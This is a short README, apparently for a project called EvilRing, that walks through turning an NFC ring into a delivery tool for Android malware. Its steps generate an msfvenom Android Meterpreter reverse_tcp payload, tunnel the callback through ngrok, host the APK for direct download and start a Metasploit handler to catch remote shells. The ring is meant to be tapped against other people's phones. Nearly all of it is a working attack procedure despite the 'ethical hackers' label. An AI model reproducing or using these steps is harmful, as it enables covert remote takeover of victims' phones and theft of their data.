# EvilRing
EvilRing: An NFC Ring for ethical hackers

Setup:

1. Install ngrok using the following commands:
  
`wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xzvf ngrok-v3-stable-linux-amd64.tgz
chmod +x ngrok
sudo mv ngrok /usr/local/bin/ngrok
rm ngrok-v3-stable-linux-amd64.tgz
ngrok config add-authtoken YOUR-AUTH-TOKEN-HERE`

2. Create an ngrok TCP tunnel

(Free Version)

`ngrok tcp 4242`

(Paid Version) - Recommended
Start your reserved TCP tunnel from ngrok dashboard and then connect to it from your terminal. 
This way the connection is persistent anywhere in the world. 
Replace the stars with your specific ngrok address and port number. 4242 will be the port we listen to locally for connections on metasploit.

`ngrok tcp --region=us --remote-addr=*.tcp.ngrok.io:* 4242`

3. Generate your payload with msfvenom, change the ngrok variables:
  
`msfvenom -p android/meterpreter/reverse_tcp LHOST=<ngrok tunnel ip> LPORT=<ngrok tunnel port> -o evilring.apk`

4. Serve your file from a direct-download link (like python3 httpserver and another ngrok tunnel for toss-away file host):
  
`python3 -m http.server 8080
./ngrok http 8080`

5. Copy your direct download link to your NFC ring (http://***.***/evilring.apk)
This can be done with the proxmark3, chameleon tiny, or even just an NFC enabled device using the NFC Tools app.

6. On your command and control open msfconsole:
  
`msfconsole -q

(inside msfconsole) 
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4242
run`
  
7.  (Dont) go an hold onto some phones!
